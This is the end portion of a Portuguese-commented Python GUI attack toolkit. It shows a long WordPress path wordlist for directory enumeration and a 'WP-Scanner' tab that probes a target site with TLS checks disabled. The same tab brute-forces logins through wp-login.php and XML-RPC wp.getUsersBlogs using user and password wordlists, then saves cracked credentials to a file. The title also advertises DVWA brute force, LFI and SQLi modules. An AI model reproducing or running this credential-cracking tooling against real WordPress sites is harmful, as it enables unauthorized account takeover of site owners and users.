    "wp-admin/js/iris.min.js",
    "wp-admin/js/plugin-install.js",
    "wp-admin/js/password-toggle.js",
    "wp-admin/js/link.js",
    "wp-admin/js/user-profile.js",
    "wp-admin/js/set-post-thumbnail.min.js",
    "wp-admin/js/password-toggle.min.js",
    "wp-admin/js/site-health.js",
    "wp-admin/js/customize-controls.min.js",
    "wp-admin/js/site-icon.js",
    "wp-admin/js/plugin-install.min.js",
    "wp-admin/js/updates.js",
    "wp-admin/js/theme.min.js",
    "wp-admin/js/color-picker.min.js",
    "wp-admin/js/nav-menu.js",
    "wp-admin/js/theme-plugin-editor.js",
    "wp-admin/js/user-suggest.js",
    "wp-admin/js/word-count.js",
    "wp-admin/js/inline-edit-tax.js",
    "wp-admin/js/user-profile.min.js",
    "wp-admin/js/language-chooser.js",
    "wp-admin/js/updates.min.js",
    "wp-admin/js/code-editor.min.js",
    "wp-admin/js/set-post-thumbnail.js",
    "wp-admin/js/gallery.js",
    "wp-admin/js/nav-menu.min.js",
    "wp-admin/js/auth-app.min.js",
    "wp-admin/js/editor-expand.min.js",
    "wp-admin/js/accordion.min.js",
    "wp-admin/js/media-gallery.min.js",
    "wp-admin/js/application-passwords.js",
    "wp-admin/js/tags-box.min.js",
    "wp-admin/js/customize-nav-menus.js",
    "wp-admin/js/media-upload.min.js",
    "wp-admin/js/xfn.js",
    "wp-admin/js/media.min.js",
    "wp-admin/js/image-edit.js",
    "wp-admin/js/custom-header.js",
    "wp-admin/js/application-passwords.min.js",
    "wp-admin/js/password-strength-meter.js",
    "wp-admin/js/site-icon.min.js",
    "wp-admin/js/tags-suggest.min.js",
    "wp-admin/js/editor-expand.js",
    "wp-admin/js/comment.js",
    "wp-admin/js/revisions.min.js",
    "wp-admin/js/inline-edit-post.min.js",
    "wp-admin/js/revisions.js",
    "wp-admin/js/customize-nav-menus.min.js",
    "wp-admin/js/password-strength-meter.min.js",
    "wp-admin/js/editor.min.js",
    "wp-admin/js/auth-app.js",
    "wp-admin/js/privacy-tools.js",
    "wp-admin/js/tags.min.js",
    "wp-admin/js/comment.min.js",
    "wp-admin/js/image-edit.min.js",
    "wp-admin/js/theme.js",
    "wp-admin/js/media-upload.js",
    "wp-admin/js/media-gallery.js",
    "wp-admin/js/media.js",
    "wp-admin/js/svg-painter.min.js",
    "wp-admin/js/dashboard.js",
    "wp-admin/js/postbox.js",
    "wp-admin/js/user-suggest.min.js",
    "wp-admin/js/post.min.js",
    "wp-admin/js/widgets.min.js",
    "wp-admin/js/theme-plugin-editor.min.js",
    "wp-admin/js/color-picker.js",
    "wp-admin/js/farbtastic.js",
    "wp-admin/edit-link-form.php",
    "wp-admin/widgets.php",
    "wp-admin/update-core.php",
    "wp-admin/plugin-editor.php",
    "wp-admin/options-permalink.php",
    "wp-admin/options-writing.php",
    "wp-admin/load-scripts.php",
    "wp-admin/moderation.php",
    "wp-admin/media.php",
    "wp-admin/link.php",
    "wp-admin/edit-form-advanced.php",
    "wp-admin/term.php",
    "wp-admin/my-sites.php",
    "wp-admin/ms-themes.php",
    "wp-admin/network/themes.php",
    "wp-admin/network/settings.php",
    "wp-admin/network/admin.php",
    "wp-admin/network/freedoms.php",
    "wp-admin/network/credits.php",
    "wp-admin/network/about.php",
    "wp-admin/network/menu.php",
    "wp-admin/network/plugin-install.php",
    "wp-admin/network/update.php",
    "wp-admin/network/theme-install.php",
    "wp-admin/network/privacy.php",
    "wp-admin/network/site-themes.php",
    "wp-admin/network/user-edit.php",
    "wp-admin/network/user-new.php",
    "wp-admin/network/site-settings.php",
    "wp-admin/network/update-core.php",
    "wp-admin/network/plugin-editor.php",
    "wp-admin/network/setup.php",
    "wp-admin/network/contribute.php",
    "wp-admin/network/sites.php",
    "wp-admin/network/site-users.php",
    "wp-admin/network/profile.php",
    "wp-admin/network/plugins.php",
    "wp-admin/network/index.php",
    "wp-admin/network/upgrade.php",
    "wp-admin/network/site-info.php",
    "wp-admin/network/theme-editor.php",
    "wp-admin/network/edit.php",
    "wp-admin/network/users.php",
    "wp-admin/network/site-new.php",
    "wp-admin/admin-functions.php",
    "wp-admin/ms-sites.php",
    "wp-admin/export-personal-data.php",
    "wp-admin/link-manager.php",
    "wp-admin/contribute.php",
    "wp-admin/comment.php",
    "wp-admin/options-reading.php",
    "wp-admin/export.php",
    "wp-admin/link-add.php",
    "wp-admin/widgets-form-blocks.php",
    "wp-admin/menu-header.php",
    "wp-admin/network.php",
    "wp-admin/edit-tags.php",
    "wp-admin/user/admin.php",
    "wp-admin/user/freedoms.php",
    "wp-admin/user/credits.php",
    "wp-admin/user/about.php",
    "wp-admin/user/menu.php",
    "wp-admin/user/privacy.php",
    "wp-admin/user/user-edit.php",
    "wp-admin/user/contribute.php",
    "wp-admin/user/profile.php",
    "wp-admin/user/index.php",
    "wp-admin/load-styles.php",
    "wp-admin/upload.php",
    "wp-admin/profile.php",
    "wp-admin/admin-ajax.php",
    "wp-admin/options-general.php",
    "wp-admin/includes/revision.php",
    "wp-admin/includes/template.php",
    "wp-admin/includes/class-language-pack-upgrader.php",
    "wp-admin/includes/class-plugin-upgrader-skin.php",
    "wp-admin/includes/class-wp-plugin-install-list-table.php",
    "wp-admin/includes/class-wp-ms-sites-list-table.php",
    "wp-admin/includes/class-wp-upgrader-skins.php",
    "wp-admin/includes/class-wp-filesystem-ssh2.php",
    "wp-admin/includes/class-ftp-pure.php",
    "wp-admin/includes/class-plugin-installer-skin.php",
    "wp-admin/includes/options.php",
    "wp-admin/includes/class-wp-upgrader-skin.php",
    "wp-admin/includes/class-wp-privacy-requests-table.php",
    "wp-admin/includes/admin.php",
    "wp-admin/includes/class-bulk-plugin-upgrader-skin.php",
    "wp-admin/includes/ms-admin-filters.php",
    "wp-admin/includes/bookmark.php",
    "wp-admin/includes/class-pclzip.php",
    "wp-admin/includes/schema.php",
    "wp-admin/includes/class-wp-privacy-policy-content.php",
    "wp-admin/includes/class-wp-importer.php",
    "wp-admin/includes/credits.php",
    "wp-admin/includes/meta-boxes.php",
    "wp-admin/includes/class-wp-media-list-table.php",
    "wp-admin/includes/class-wp-terms-list-table.php",
    "wp-admin/includes/class-wp-ms-users-list-table.php",
    "wp-admin/includes/class-wp-users-list-table.php",
    "wp-admin/includes/class-bulk-theme-upgrader-skin.php",
    "wp-admin/includes/menu.php",
    "wp-admin/includes/plugin-install.php",
    "wp-admin/includes/class-ftp.php",
    "wp-admin/includes/update.php",
    "wp-admin/includes/import.php",
    "wp-admin/includes/class-wp-site-health-auto-updates.php",
    "wp-admin/includes/plugin.php",
    "wp-admin/includes/theme-install.php",
    "wp-admin/includes/class-custom-image-header.php",
    "wp-admin/includes/noop.php",
    "wp-admin/includes/class-wp-themes-list-table.php",
    "wp-admin/includes/user.php",
    "wp-admin/includes/class-wp-theme-install-list-table.php",
    "wp-admin/includes/class-wp-internal-pointers.php",
    "wp-admin/includes/class-custom-background.php",
    "wp-admin/includes/class-wp-privacy-data-removal-requests-list-table.php",
    "wp-admin/includes/class-language-pack-upgrader-skin.php",
    "wp-admin/includes/class-wp-plugins-list-table.php",
    "wp-admin/includes/class-wp-site-icon.php",
    "wp-admin/includes/class-wp-ajax-upgrader-skin.php",
    "wp-admin/includes/ms-deprecated.php",
    "wp-admin/includes/class-walker-nav-menu-edit.php",
    "wp-admin/includes/class-wp-ms-themes-list-table.php",
    "wp-admin/includes/class-wp-filesystem-base.php",
    "wp-admin/includes/widgets.php",
    "wp-admin/includes/update-core.php",
    "wp-admin/includes/class-theme-upgrader-skin.php",
    "wp-admin/includes/class-wp-site-health.php",
    "wp-admin/includes/class-automatic-upgrader-skin.php",
    "wp-admin/includes/class-wp-filesystem-ftpsockets.php",
    "wp-admin/includes/media.php",
    "wp-admin/includes/edit-tag-messages.php",
    "wp-admin/includes/class-wp-debug-data.php",
    "wp-admin/includes/class-wp-community-events.php",
    "wp-admin/includes/class-wp-links-list-table.php",
    "wp-admin/includes/class-wp-privacy-data-export-requests-list-table.php",
    "wp-admin/includes/dashboard.php",
    "wp-admin/includes/class-wp-posts-list-table.php",
    "wp-admin/includes/class-file-upload-upgrader.php",
    "wp-admin/includes/class-wp-filesystem-direct.php",
    "wp-admin/includes/class-wp-filesystem-ftpext.php",
    "wp-admin/includes/class-theme-installer-skin.php",
    "wp-admin/includes/image-edit.php",
    "wp-admin/includes/comment.php",
    "wp-admin/includes/class-wp-screen.php",
    "wp-admin/includes/class-wp-list-table-compat.php",
    "wp-admin/includes/class-wp-post-comments-list-table.php",
    "wp-admin/includes/export.php",
    "wp-admin/includes/class-plugin-upgrader.php",
    "wp-admin/includes/ajax-actions.php",
    "wp-admin/includes/network.php",
    "wp-admin/includes/taxonomy.php",
    "wp-admin/includes/continents-cities.php",
    "wp-admin/includes/file.php",
    "wp-admin/includes/privacy-tools.php",
    "wp-admin/includes/class-wp-application-passwords-list-table.php",
    "wp-admin/includes/admin-filters.php",
    "wp-admin/includes/class-wp-upgrader.php",
    "wp-admin/includes/class-wp-automatic-updater.php",
    "wp-admin/includes/translation-install.php",
    "wp-admin/includes/theme.php",
    "wp-admin/includes/misc.php",
    "wp-admin/includes/ms.php",
    "wp-admin/includes/list-table.php",
    "wp-admin/includes/class-bulk-upgrader-skin.php",
    "wp-admin/includes/upgrade.php",
    "wp-admin/includes/class-core-upgrader.php",
    "wp-admin/includes/class-ftp-sockets.php",
    "wp-admin/includes/screen.php",
    "wp-admin/includes/nav-menu.php",
    "wp-admin/includes/class-wp-comments-list-table.php",
    "wp-admin/includes/image.php",
    "wp-admin/includes/class-wp-list-table.php",
    "wp-admin/includes/deprecated.php",
    "wp-admin/includes/post.php",
    "wp-admin/includes/class-walker-category-checklist.php",
    "wp-admin/includes/class-walker-nav-menu-checklist.php",
    "wp-admin/includes/class-theme-upgrader.php",
    "wp-admin/plugins.php",
    "wp-admin/maint/repair.php",
    "wp-admin/options-discussion.php",
    "wp-admin/index.php",
    "wp-admin/upgrade.php",
    "wp-admin/site-health-info.php",
    "wp-admin/admin-header.php",
    "wp-admin/ms-options.php",
    "wp-admin/theme-editor.php",
    "wp-admin/edit.php",
    "wp-admin/upgrade-functions.php",
    "wp-admin/link-parse-opml.php",
    "wp-admin/users.php",
    "wp-admin/media-new.php",
    "wp-admin/custom-background.php",
    "wp-admin/edit-tag-form.php",
    "wp-admin/edit-form-blocks.php",
    "wp-admin/edit-comments.php",
    "wp-admin/post.php",
    "wp-trackback.php",
    "wp-settings.php",
    "wp-signup.php",
    "index.php",

    

]

ARQUIVO_LISTA = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "lista_diretorios.txt")

STATUS_INTERESSE = (200, 301, 302, 401, 403, 500)


def carregar_paths():
    """Carrega a lista grande de diretórios/arquivos. Fallback p/ lista curta."""
    if os.path.isfile(ARQUIVO_LISTA):
        try:
            with open(ARQUIVO_LISTA, "r", encoding="utf-8", errors="ignore") as f:
                words = [l.strip().lstrip("/") for l in f
                         if l.strip() and not l.strip().startswith("#")]
            return list(dict.fromkeys(words))
        except OSError:
            pass
    return WORDPRESS_PATHS_PADRAO[:]


WORDPRESS_PATHS = carregar_paths()


class WpTab(ttk.Frame):
    def __init__(self, parent):
        super().__init__(parent, padding=8)
        self.found = []              # (usuario, senha)
        self.found_users = set()
        self.scan_results = []       # [(url, status)]
        self.stop_event = threading.Event()
        self.lock = threading.Lock()
        self._build_ui()
        self.log(f"[*] WP-Scanner carregado! Alvo padrão: {WP_URL_FIXA}\n")
        self.log(f"[*] Lista de paths: {len(WORDPRESS_PATHS)} entradas "
                 f"({'carregada de lista_diretorios.txt' if os.path.isfile(ARQUIVO_LISTA) else 'fallback embutida'})\n")

    def _build_ui(self):
        frm = ttk.LabelFrame(self, text=" WordPress Scanner ", padding=8)
        frm.pack(fill="x", padx=5, pady=5)
        for c in range(4):
            frm.columnconfigure(c, weight=1)

        ttk.Label(frm, text="URL alvo:").grid(row=0, column=0, sticky="w")
        self.url = ttk.Entry(frm, width=60)
        self.url.insert(0, WP_URL_FIXA)
        self.url.grid(row=0, column=1, columnspan=3, sticky="we", pady=3)

        ttk.Label(frm, text="Wordlist (senhas):", style="Orange.TLabel").grid(
            row=1, column=0, sticky="w")
        self.wl = ttk.Entry(frm, width=50)
        self.wl.grid(row=1, column=1, columnspan=2, sticky="we", pady=3)
        ttk.Button(frm, text="Procurar...", command=self.pick).grid(row=1, column=3, padx=5)

        ttk.Label(frm, text="Usuários (1 por linha):").grid(row=2, column=0, sticky="nw")
        self.users = tk.Text(frm, height=6, width=60, bg=BG2, fg=FG,
                             insertbackground=FG, font=(MONO, 9),
                             relief="flat", highlightbackground=FG_DIM)
        self.users.grid(row=2, column=1, columnspan=2, sticky="we", pady=3)
        ttk.Button(frm, text="Carregar wordlist\nde usuários", command=self.pick_users).grid(
            row=2, column=3, padx=5)

        linha3 = ttk.Frame(frm)
        linha3.grid(row=3, column=0, columnspan=4, sticky="we", pady=3)
        ttk.Label(linha3, text="Método:").pack(side="left")
        self.method = ttk.Combobox(linha3, values=["wp-login", "xmlrpc"], state="readonly", width=10)
        self.method.current(0)
        self.method.pack(side="left", padx=5)
        ttk.Label(linha3, text="Threads:").pack(side="left", padx=(10, 2))
        self.threads_v = tk.StringVar(value="5")
        ttk.Entry(linha3, width=5, textvariable=self.threads_v).pack(side="left")
        ttk.Label(linha3, text="Scan threads:").pack(side="left", padx=(10, 2))
        self.scan_threads_v = tk.StringVar(value="5")
        ttk.Entry(linha3, width=5, textvariable=self.scan_threads_v).pack(side="left")
        ttk.Label(linha3, text="Filtrar status:").pack(side="left", padx=(10, 2))
        # Editável: escolha um preset OU digite manualmente (ex.: 200 | 200,301,302 | 403)
        self.filtro_status = ttk.Combobox(
            linha3, values=["200+301", "200 + 301 + outros", "Somente 200",
                            "Somente 301/302", "Somente 401/403", "Tudo"],
            state="normal", width=20)
        self.filtro_status.current(0)
        self.filtro_status.pack(side="left", padx=4)

        btns = ttk.Frame(frm)
        btns.grid(row=4, column=0, columnspan=4, pady=8, sticky="we")
        for c in range(5):
            btns.columnconfigure(c, weight=1)
        ttk.Button(btns, text="1) Scan de arquivos", command=self.scan_files).grid(
            row=0, column=0, padx=4, sticky="we")
        ttk.Button(btns, text="2) Brute Force", command=self.brute).grid(
            row=0, column=1, padx=4, sticky="we")
        ttk.Button(btns, text="3) Salvar scan .txt", command=self.save_scan).grid(
            row=0, column=2, padx=4, sticky="we")
        ttk.Button(btns, text="4) Salvar senhas .txt", command=self.save_results).grid(
            row=0, column=3, padx=4, sticky="we")
        ttk.Button(btns, text="[ Limpar ]", command=self.limpar).grid(
            row=0, column=4, padx=4, sticky="we")

        self.progress = ttk.Progressbar(frm, mode="determinate", maximum=100)
        self.progress.grid(row=5, column=0, columnspan=4, sticky="we", pady=3)

        out_frame = ttk.LabelFrame(self, text=" Saída ", padding=5)
        out_frame.pack(fill="both", expand=True, padx=5, pady=5)
        self.log_area = make_log(out_frame)
        self.log_area.pack(fill="both", expand=True)

    # ---------- log ----------
    def log(self, msg):
        self.after(0, lambda: log_insert(self.log_area, msg))

    # ---------- limpar ----------
    def limpar(self):
        if self._worker_ativo():
            messagebox.showwarning("Limpar", "Há uma varredura/ataque em andamento.\n"
                                             "Aguarde finalizar antes de limpar.")
            return
        with self.lock:
            self.scan_results = []
            self.found = []
            self.found_users = set()
        self.log_area.configure(state="normal")
        self.log_area.delete("1.0", "end")
        self.log_area.configure(state="disabled")
        self.progress.config(value=0)
        self.log("[*] Resultados limpos. Pronto para nova varredura.\n")

    def _worker_ativo(self):
        # heurística simples: progresso parcial indica atividade em andamento
        try:
            return 0 < self.progress["value"] < 100
        except Exception:
            return False

    # ---------- file dialogs ----------
    def pick(self):
        p = filedialog.askopenfilename(title="Wordlist",
                                       filetypes=[("Texto", "*.txt"), ("Todos", "*.*")])
        if p:
            self.wl.delete(0, "end")
            self.wl.insert(0, p)

    def pick_users(self):
        p = filedialog.askopenfilename(title="Wordlist de Usuários",
                                       filetypes=[("Texto", "*.txt"), ("Todos", "*.*")])
        if p:
            try:
                with open(p, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                self.users.delete("1.0", "end")
                self.users.insert("1.0", content)
                n = len([u for u in content.splitlines() if u.strip()])
                self.log(f"[*] Wordlist de usuários carregada: {n} usuários")
            except Exception as e:
                messagebox.showerror("Erro", f"Não foi possível ler o arquivo: {e}")

    # ---------- salvar ----------
    def save_scan(self):
        if not self.scan_results:
            messagebox.showinfo("Aviso", "Nenhum resultado de scan ainda. "
                                         "Execute o 'Scan de arquivos' primeiro.")
            return
        p = filedialog.asksaveasfilename(
            title="Salvar scan", defaultextension=".txt",
            filetypes=[("Texto", "*.txt")], initialfile="scan_arquivos.txt")
        if not p:
            return
        try:
            with open(p, "w", encoding="utf-8") as f:
                f.write(f"# WP-Scanner — Scan de arquivos ({len(self.scan_results)} encontrados)\n")
                f.write(f"# Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
                f.write(f"# Alvo: {self.url.get().strip()}\n\n")
                for url, status in self.scan_results:
                    f.write(f"[{status}] {url}\n")
            self.log(f"[+] Scan salvo em: {p} ({len(self.scan_results)} arquivos)")
            messagebox.showinfo("Sucesso", f"Scan salvo em:\n{p}")
        except Exception as e:
            messagebox.showerror("Erro", f"Não foi possível salvar: {e}")

    def save_results(self):
        if not self.found:
            messagebox.showinfo("Aviso", "Nenhuma credencial encontrada ainda para salvar.")
            return
        p = filedialog.asksaveasfilename(
            title="Salvar senhas", defaultextension=".txt",
            filetypes=[("Texto", "*.txt")], initialfile="senhas_encontradas.txt")
        if not p:
            return
        try:
            with open(p, "w", encoding="utf-8") as f:
                f.write(f"# WP-Scanner — Resultados ({len(self.found)} credenciais)\n")
                f.write(f"# Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
                f.write(f"# Alvo: {self.url.get().strip()}\n\n")
                for u, pw in self.found:
                    f.write(f"{u}:{pw}\n")
            self.log(f"[+] Senhas salvas em: {p}")
            messagebox.showinfo("Sucesso", f"Credenciais salvas em:\n{p}")
        except Exception as e:
            messagebox.showerror("Erro", f"Não foi possível salvar: {e}")

    # ---------- filtro de status (presets + entrada manual) ----------
    def _codigos_filtro(self):
        """Retorna set de códigos aceitos a partir do combobox."""
        texto = self.filtro_status.get().strip()
        # entrada manual: números separados por vírgula/espaço (ex.: 200,301)
        if re.fullmatch(r"[\d\s,;]+", texto or ""):
            cods = set()
            for parte in re.split(r"[,\s;]+", texto):
                if parte.isdigit():
                    cods.add(int(parte))
            return cods if cods else set(STATUS_INTERESSE)
        # presets
        if texto == "Tudo":
            return set(STATUS_INTERESSE)
        if texto == "Somente 200":
            return {200}
        if texto == "Somente 301/302":
            return {301, 302}
        if texto == "Somente 401/403":
            return {401, 403}
        if texto == "200+301":
            return {200, 301}
        return set(STATUS_INTERESSE)  # "200 + 301 + outros" ou vazio

    # ---------- scan de arquivos (multi-thread) ----------
    def scan_files(self):
        base = self.url.get().strip().rstrip("/")
        if not base:
            messagebox.showerror("Erro", "Informe a URL alvo.")
            return
        try:
            n_threads = int(self.scan_threads_v.get())
        except ValueError:
            n_threads = 5
        n_threads = max(1, min(n_threads, 50))

        # snapshot do filtro no momento do início (thread-safe)
        codigos = self._codigos_filtro()
        filtro = self.filtro_status.get().strip() or "padrão"

        self.log(f"\n[*] Varredura de arquivos em: {base}\n")
        self.log(f"[*] {len(WORDPRESS_PATHS)} caminhos | {n_threads} threads | "
                 f"filtro: {filtro} {sorted(codigos)}\n")

        def run():
            resultados = []
            total = len(WORDPRESS_PATHS)
            done = 0
            seen = set()

            def probe(path):
                url = f"{base}/{path}"
                try:
                    r = requests.get(url, headers=WP_UA, timeout=10, verify=False,
                                     allow_redirects=False)
                    return path, url, r.status_code, r
                except Exception:
                    return path, url, None, None

            with ThreadPoolExecutor(max_workers=n_threads) as pool:
                futures = [pool.submit(probe, p) for p in WORDPRESS_PATHS]
                for fut in as_completed(futures):
                    if self.stop_event.is_set():
                        break
                    path, url, status, r = fut.result()
                    done += 1
                    if done % 50 == 0 or done == total:
                        self.log(f"\n[*] Progresso: {done}/{total}")
                        self.after(0, lambda v=int(done * 100 / total):
                                   self.progress.config(value=v))
                    if status is None or status not in codigos:
                        continue
                    # heurística anti falso-positivo: 404 customizado do WP com 200
                    if status == 200 and r is not None:
                        low = r.text[:4000].lower()
                        if ("page not found" in low or "nada encontrado" in low
                                or "nothing found" in low):
                            continue
                    key = (url, status)
                    if key in seen:
                        continue
                    seen.add(key)

                    size = len(r.text) if r is not None else 0

                    if status in (301, 302):
                        loc = r.headers.get("Location", "") if r is not None else ""
                        self.log(f"[{status}] {url:<50} -> {loc or '(sem Location)'}")
                    elif status in (401, 403):
                        self.log(f"[{status}] {url:<80} <- existe mas protegido {size:>20} bytes")
                    else:
                        self.log(f"[{status}] {url:<80}  {size:>20} bytes")
                    resultados.append((url, status))

            with self.lock:
                self.scan_results = resultados
            self.log(f"\n[*] Varredura concluída. {len(resultados)} recursos com o filtro "
                     f"'{filtro}' em {total} caminhos.\n")
            self.log("[*] Use o botão '3) Salvar scan .txt' para exportar.")
            self.after(0, lambda: self.progress.config(value=100))

        self.stop_event.clear()
        threading.Thread(target=run, daemon=True).start()

    # ---------- brute force ----------
    def bf_login(self, base, user, pwd):
        s = requests.Session()
        try:
            r = s.get(base.rstrip("/") + "/wp-login.php", timeout=15, verify=False,
                      allow_redirects=True, headers=WP_UA)
            data = {
                "log": user, "pwd": pwd, "rememberme": "forever",
                "wp-submit": "Log In", "redirect_to": base + "/wp-admin/",
                "testcookie": "1",
            }
            if BeautifulSoup is not None:
                soup = BeautifulSoup(r.text, "html.parser")
                for inp in soup.find_all("input"):
                    n, v = inp.get("name"), inp.get("value")
                    if n and n not in data and v:
                        data[n] = v
            r2 = s.post(base.rstrip("/") + "/wp-login.php", data=data, timeout=15,
                        verify=False, allow_redirects=True, headers=WP_UA)
            if "wp-admin" in (r2.url or "") or "dashboard" in r2.text[:4000].lower():
                self.log(f"\n[VULN] SUCESSO: Usuario = {user:<15} Senha = {pwd}\n")
                with self.lock:
                    self.found.append((user, pwd))
                return True
        except Exception:
            pass
        return False

    def bf_xmlrpc(self, base, user, pwd):
        xml = (f'<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName>'
               f'<params><param><value>{user}</value></param>'
               f'<param><value>{pwd}</value></param></params></methodCall>')
        try:
            r = requests.post(base.rstrip("/") + "/xmlrpc.php", data=xml, timeout=15,
                              verify=False, headers=WP_UA)
            if "200 OK" in r.text or "<name>blogid" in r.text.lower():
                return True
        except Exception:
            pass
        return False

    def worker(self, q, base, method, total_users):
        while not self.stop_event.is_set() and not q.empty():
            try:
                user, pwd = q.get_nowait()
            except queue.Empty:
                break
            try:
                with self.lock:
                    if user in self.found_users:
                        continue
                self.log(f"[*] Testando usuario = {user:<15} senha = {pwd}")
                ok = False
                if method == "xmlrpc":
                    ok = self.bf_xmlrpc(base, user, pwd)
                    if ok:
                        with self.lock:
                            self.found.append((user, pwd))
                            self.found_users.add(user)
                            restantes = total_users - len(self.found_users)
                        self.log(f"[VULN] SUCESSO (XMLRPC): usuario = {user:<15} senha = {pwd}")
                        if restantes <= 0:
                            self.log("[+] TODOS os usuários quebrados! Parando...")
                            self.stop_event.set()
                            break
                else:
                    ok = self.bf_login(base, user, pwd)
                    if ok:
                        with self.lock:
                            self.found_users.add(user)
                            restantes = total_users - len(self.found_users)
                        if restantes <= 0:
                            self.log("[+] TODOS os usuários quebrados! Parando")
                            self.stop_event.set()
                            break
                if not ok and not self.stop_event.is_set():
                    self.log(f"[-] Falha: {user}:{pwd}")
            except Exception as e:
                self.log(f"[!] Erro {user}: {e}")
            finally:
                q.task_done()

    def brute(self):
        base = self.url.get().strip().rstrip("/")
        wl_path = self.wl.get().strip()
        users = [u.strip() for u in self.users.get("1.0", "end").splitlines() if u.strip()]
        if not users:
            messagebox.showerror("Erro", "Informe ou carregue uma wordlist de usuários primeiro.")
            return
        users = list(dict.fromkeys(users))
        if not wl_path or not os.path.isfile(wl_path):
            messagebox.showerror("Erro", "Wordlist inválida ou não encontrada.")
            return
        try:
            with open(wl_path, "r", encoding="utf-8", errors="ignore") as f:
                words = [w.strip() for w in f if w.strip()]
        except Exception:
            messagebox.showerror("Erro", "Wordlist inválida ou não encontrada.")
            return
        if not words:
            messagebox.showerror("Erro", "A wordlist de senhas está vazia.")
            return
        try:
            n = int(self.threads_v.get())
        except ValueError:
            n = 5

        q = queue.Queue()
        for u, p in itertools.product(users, words):
            q.put((u, p))

        self.found.clear()
        self.found_users.clear()
        self.stop_event.clear()
        self.progress.config(value=0)

        self.log(f"\n[*] Brute force iniciado: {len(users)} usuários x {len(words)} senhas = "
                 f"{q.qsize()} tentativas ({n} threads)\n")
        self.log(f"[*] Alvo: {base} — usuários: {', '.join(users)}\n\n")

        for _ in range(n):
            threading.Thread(target=self.worker,
                             args=(q, base, self.method.get(), len(users)),
                             daemon=True).start()

        def monitor():
            q.join()
            if not self.stop_event.is_set():
                if self.found:
                    self.log("[*] Fila finalizada. Usuários quebrados:")
                    for u, p in self.found:
                        self.log(f"    [+] {u} : {p}")
                    nao = [u for u in users if u not in self.found_users]
                    if nao:
                        self.log(f"[-] Sem senha encontrada para: {', '.join(nao)}")
                else:
                    self.log("[-] Nenhuma credencial encontrada.")
            self.log("[*] Brute force finalizado. Use o botão 'Salvar senhas .txt' para exportar.")
            self.after(0, lambda: self.progress.config(value=100))

        threading.Thread(target=monitor, daemon=True).start()


# =====================================================================
# MAIN
# =====================================================================
def main():
    root = tk.Tk()
    root.title("Multi Toolkit DVWA BF/LFI + SQLi + Login BF + WP-Scanner")
    root.geometry("1150x860")
    root.minsize(900, 640)
    apply_theme(root)

    notebook = ttk.Notebook(root)
    notebook.pack(fill="both", expand=True, padx=8, pady=8)

    notebook.add(DvwaTab(notebook), text="  DVWA Brute Force + LFI  ")
    notebook.add(SqliTab(notebook), text="  SQLi Scanner  ")
    notebook.add(LoginTab(notebook), text="  Login Brute Force  ")
    notebook.add(WpTab(notebook), text="  WP-Scanner  ")

    root.mainloop()


if __name__ == "__main__":
    main()
